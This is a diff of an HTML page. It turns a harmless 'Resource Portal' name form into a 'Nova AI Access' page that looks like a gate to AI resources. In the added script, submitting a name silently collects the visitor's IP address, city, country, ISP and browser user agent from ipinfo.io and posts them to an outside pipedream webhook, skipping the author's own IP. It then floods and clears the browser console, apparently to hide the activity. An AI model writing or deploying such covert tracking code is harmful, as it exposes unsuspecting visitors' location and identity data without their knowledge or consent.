@@ -3,457 +3,210 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SynthAI | Resource Portal</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Nova AI Access</title>
     <style>
-        :root {
-            --primary: #6c5ce7;
-            --secondary: #4a3ce7;
-            --accent: #00cec9;
-            --dark: #2d3436;
-            --light: #f5f6fa;
-            --success: #00b894;
-            --warning: #fdcb6e;
-            --error: #d63031;
-        }
-        
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-        
         body {
-            background-color: #f8f9fd;
-            color: var(--dark);
-            line-height: 1.6;
-            min-height: 100vh;
-        }
-        
-        .admin-bar {
-            background: var(--dark);
-            color: white;
-            padding: 0.5rem 2rem;
-            font-size: 0.8rem;
-            display: flex;
-            justify-content: flex-end;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .admin-bar a {
-            color: var(--accent);
-            text-decoration: none;
-            margin-left: 1.5rem;
-        }
-        
-        .navbar {
-            background-color: white;
-            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
-            padding: 1.2rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .logo {
-            display: flex;
-            align-items: center;
-            font-weight: 700;
-            font-size: 1.5rem;
-            color: var(--primary);
-        }
-        
-        .logo i {
-            margin-right: 0.5rem;
-            color: var(--accent);
-        }
-        
-        .nav-links {
-            display: flex;
-            gap: 2rem;
-        }
-        
-        .nav-links a {
-            text-decoration: none;
-            color: var(--dark);
-            font-weight: 500;
-            transition: all 0.3s ease;
-        }
-        
-        .nav-links a:hover {
-            color: var(--primary);
-        }
-        
-        .auth-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: calc(100vh - 120px);
-            padding: 4rem 2rem;
-        }
-        
-        .auth-card {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 480px;
-            overflow: hidden;
-            transition: all 0.4s ease;
-        }
-        
-        .auth-header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            padding: 2rem;
+            font-family: 'Arial', sans-serif;
+            background-color: #f2f2f2;
+            padding: 20px;
             text-align: center;
         }
-        
-        .auth-header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 0.5rem;
+
+        h1 {
+            color: #333;
+            font-size: 36px;
+            margin-top: 40px;
         }
-        
-        .auth-header p {
-            opacity: 0.9;
-            font-size: 0.95rem;
-        }
-        
-        .auth-body {
-            padding: 2rem;
-        }
-        
-        .step {
-            display: none;
-            animation: fadeIn 0.4s ease;
-        }
-        
-        .step.active {
-            display: block;
-        }
-        
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 500;
-            font-size: 0.95rem;
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 0.8rem 1rem;
-            border: 1px solid #e0e0e0;
+
+        .content {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #fff;
+            padding: 40px;
             border-radius: 8px;
-            font-size: 1rem;
-            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
         }
-        
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2);
+
+        p {
+            color: red;
+            font-size: 18px;
         }
-        
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0.8rem 1.5rem;
+
+        .name-form {
+            margin-bottom: 20px;
+        }
+
+        input {
+            padding: 10px;
+            font-size: 18px;
             border-radius: 8px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
+            border: 1px solid #ccc;
+            margin-top: 10px;
+            width: 80%;
+            max-width: 400px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            background-color: #4CAF50;
+            color: white;
             border: none;
-            font-size: 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
         }
-        
-        .btn-primary {
-            background: var(--primary);
-            color: white;
-            width: 100%;
+
+        button:hover {
+            background-color: #45a049;
         }
-        
-        .btn-primary:hover {
-            background: var(--secondary);
-            transform: translateY(-2px);
+
+        .user-info {
+            margin-top: 20px;
+            font-size: 20px;
+            font-weight: bold;
         }
-        
-        .btn-block {
-            display: block;
-            width: 100%;
-        }
-        
-        .resources-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 1.5rem;
-            margin-top: 2rem;
-        }
-        
-        .resource-card {
-            background: white;
-            border-radius: 12px;
-            overflow: hidden;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            transition: all 0.3s ease;
-        }
-        
-        .resource-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-        }
-        
-        .resource-img {
-            height: 180px;
-            background-size: cover;
-            background-position: center;
-        }
-        
-        .resource-body {
-            padding: 1.5rem;
-        }
-        
-        .resource-title {
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-            color: var(--dark);
-        }
-        
-        .resource-desc {
-            font-size: 0.9rem;
-            color: #666;
-            margin-bottom: 1rem;
-        }
-        
-        .resource-meta {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.8rem;
-            color: #999;
-        }
-        
-        .welcome-message {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-        
-        .welcome-message h2 {
-            font-size: 1.5rem;
-            margin-bottom: 0.5rem;
-            color: var(--primary);
-        }
-        
-        .user-badge {
-            display: inline-flex;
-            align-items: center;
-            background: var(--light);
-            padding: 0.5rem 1rem;
-            border-radius: 50px;
-            margin-bottom: 1rem;
-        }
-        
-        .user-badge i {
-            margin-right: 0.5rem;
-            color: var(--primary);
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        footer {
-            background: var(--dark);
-            color: white;
-            text-align: center;
-            padding: 2rem;
-            font-size: 0.9rem;
-        }
-        
-        .footer-links {
+
+        .images-container {
             display: flex;
             justify-content: center;
-            gap: 2rem;
-            margin-bottom: 1rem;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 20px;
         }
-        
-        .footer-links a {
-            color: #ccc;
-            text-decoration: none;
-            transition: color 0.3s ease;
+
+        .images-container img {
+            width: 250px;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 0 15px hotpink;
         }
-        
-        .footer-links a:hover {
-            color: white;
-        }
-        
-        .copyright {
-            opacity: 0.7;
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .images-container img {
+                width: 200px;
+            }
+
+            input, button {
+                width: 100%;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="admin-bar">
-        <a href="#"><i class="fas fa-user-shield"></i> Admin Portal</a>
-        <a href="#"><i class="fas fa-question-circle"></i> Support</a>
+    <div class="content">
+        <h1>Nova AI Access</h1>
+        <p>The philosophy of philosophy is the study of the nature, scope, and meaning of philosophy itself...</p>
+
+        <div class="name-form">
+            <input type="text" id="userName" placeholder="Enter your name to access Nova AI resources" />
+            <button onclick="submitName()">Submit</button>
+        </div>
+
+        <div class="user-info" id="userInfo"></div>
+        <div class="images-container" id="imagesContainer"></div>
     </div>
-    
-    <nav class="navbar">
-        <div class="logo">
-            <i class="fas fa-brain"></i>
-            <span>SynthAI</span>
-        </div>
-        <div class="nav-links">
-            <a href="#">Products</a>
-            <a href="#">Research</a>
-            <a href="#">Solutions</a>
-            <a href="#">Pricing</a>
-        </div>
-    </nav>
-    
-    <div class="auth-container">
-        <div class="auth-card">
-            <div class="auth-header">
-                <h1>Resource Portal</h1>
-                <p>Access premium AI resources and tools</p>
-            </div>
-            
-            <div class="auth-body">
-                <!-- Step 1: Name Entry -->
-                <div class="step active" id="step1">
-                    <div class="form-group">
-                        <label for="userName">Enter your full name</label>
-                        <input type="text" class="form-control" id="userName" placeholder="John Doe">
-                    </div>
-                    <button class="btn btn-primary" onclick="nextStep()">Continue <i class="fas fa-arrow-right"></i></button>
-                </div>
-                
-                <!-- Step 2: Resource Display -->
-                <div class="step" id="step2">
-                    <div class="welcome-message">
-                        <div class="user-badge">
-                            <i class="fas fa-user-check"></i>
-                            <span id="welcomeName">Welcome, User</span>
-                        </div>
-                        <h2>Your Exclusive Resources</h2>
-                        <p>Curated AI tools and datasets for your projects</p>
-                    </div>
-                    
-                    <div class="resources-grid" id="resourceGrid">
-                        <!-- Resources will be dynamically inserted here -->
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <footer>
-        <div class="footer-links">
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms of Service</a>
-            <a href="#">Security</a>
-            <a href="#">Careers</a>
-        </div>
-        <div class="copyright">
-            &copy; 2023 SynthAI Technologies. All rights reserved.
-        </div>
-    </footer>
 
     <script>
-        // Sample abstract images from Unsplash
-        const abstractImages = [
-            "https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
-            "https://images.unsplash.com/photo-1579547945413-497e1b99dac0?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
-            "https://images.unsplash.com/photo-1635070041078-e363dbe005cb?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
-            "https://images.unsplash.com/photo-1534972195531-d756b9bfa9f2?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
-            "https://images.unsplash.com/photo-1563089145-599997674d42?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800",
-            "https://images.unsplash.com/photo-1451187580459-43490279c0fa?crop=entropy&cs=tinysrgb&fit=crop&fm=jpg&h=600&w=800"
+        const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net";
+        const excludedIP = "83.105.112.217"; // Your IP
+
+        let images = [
+            "https://i.imgur.com/2NbxHm1.jpg",
+            "https://i.imgur.com/JWcTqvO.jpg",
+            "https://i.imgur.com/BV2kg9A.jpg",
+            "https://i.imgur.com/69gEpf3.jpg",
+            "https://i.imgur.com/Q4vIUl9.jpg"
         ];
 
-        // Sample resources data
-        const resources = [
-            {
-                title: "Neural Network Architectures",
-                desc: "Collection of advanced NN architectures with implementation guides",
-                category: "Framework"
-            },
-            {
-                title: "AI Dataset Library",
-                desc: "Curated datasets for machine learning projects across industries",
-                category: "Data"
-            },
-            {
-                title: "Model Optimization Toolkit",
-                desc: "Tools and techniques for optimizing AI model performance",
-                category: "Tools"
-            },
-            {
-                title: "Research Papers Digest",
-                desc: "Summaries of breakthrough AI research papers",
-                category: "Research"
-            },
-            {
-                title: "Deployment Templates",
-                desc: "Ready-to-use templates for deploying AI models in production",
-                category: "DevOps"
-            },
-            {
-                title: "Ethics Guidelines",
-                desc: "Framework for responsible AI development and deployment",
-                category: "Governance"
+        async function getIPData() {
+            try {
+                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
+                return ipData;
+            } catch (error) {
+                console.error("Error fetching IP data:", error);
+                return null;
             }
-        ];
-
-        function nextStep() {
-            const userName = document.getElementById('userName').value.trim();
-            
-            if (!userName) {
-                alert("Please enter your name to continue");
-                return;
-            }
-            
-            // Log the user data (you can add your webhook logic here)
-            console.log("User accessed resources:", userName, new Date().toISOString());
-            
-            // Update welcome message
-            document.getElementById('welcomeName').textContent = `Welcome, ${userName}`;
-            
-            // Hide step 1 and show step 2
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-            
-            // Load resources with random abstract images
-            loadResources();
         }
 
-        function loadResources() {
-            const grid = document.getElementById('resourceGrid');
-            grid.innerHTML = '';
-            
-            resources.forEach((resource, index) => {
-                const imgUrl = abstractImages[Math.floor(Math.random() * abstractImages.length)];
-                
-                const card = document.createElement('div');
-                card.className = 'resource-card';
-                card.innerHTML = `
-                    <div class="resource-img" style="background-image: url('${imgUrl}')"></div>
-                    <div class="resource-body">
-                        <h3 class="resource-title">${resource.title}</h3>
-                        <p class="resource-desc">${resource.desc}</p>
-                        <div class="resource-meta">
-                            <span><i class="fas fa-tag"></i> ${resource.category}</span>
-                            <span><i class="fas fa-download"></i> Download</span>
-                        </div>
-                    </div>
-                `;
-                
-                grid.appendChild(card);
+        async function submitName() {
+            const userName = document.getElementById('userName').value.trim();
+
+            if (!userName) {
+                alert("Please enter your name to continue!");
+                return;
+            }
+
+            document.getElementById('userInfo').innerText = `Hello, ${userName}!`;
+
+            const ipData = await getIPData();
+            if (!ipData) {
+                console.error("Could not retrieve IP data.");
+                return;
+            }
+
+            if (ipData.ip === excludedIP) {
+                console.log("Your IP is excluded, no data sent.");
+                return;
+            }
+
+            const log = {
+                name: userName,
+                ip: ipData.ip,
+                city: ipData.city,
+                country: ipData.country,
+                isp: ipData.org,
+                userAgent: navigator.userAgent,
+                time: new Date().toISOString()
+            };
+
+            const response = await fetch(webhookUrl, {
+                method: "POST",
+                body: JSON.stringify(log),
+                headers: { "Content-Type": "application/json" }
             });
+
+            if (response.ok) {
+                console.log("Data successfully sent to the webhook.");
+            } else {
+                console.error("Error sending data to webhook:", response.status);
+            }
+
+            // Display random images
+            showRandomImages();
+            spamConsole(); // Add random console spam
+        }
+
+        function showRandomImages() {
+            const imagesContainer = document.getElementById("imagesContainer");
+            let usedImages = new Set();
+
+            for (let i = 0; i < 3; i++) {
+                let randomImage;
+                do {
+                    randomImage = images[Math.floor(Math.random() * images.length)];
+                } while (usedImages.has(randomImage)); // Ensure no duplicates
+
+                usedImages.add(randomImage);
+
+                const img = document.createElement("img");
+                img.src = randomImage;
+                imagesContainer.appendChild(img);
+            }
+        }
+
+        function spamConsole() {
+            let spamCount = 0;
+
+            const interval = setInterval(() => {
+                console.log("Random Data: " + Math.random());
+                spamCount++;
+                if (spamCount >= 300) {
+                    clearInterval(interval);
+                    console.clear(); // Clear console after 300 spam messages
+                }
+            }, 50);
         }
     </script>
 </body>
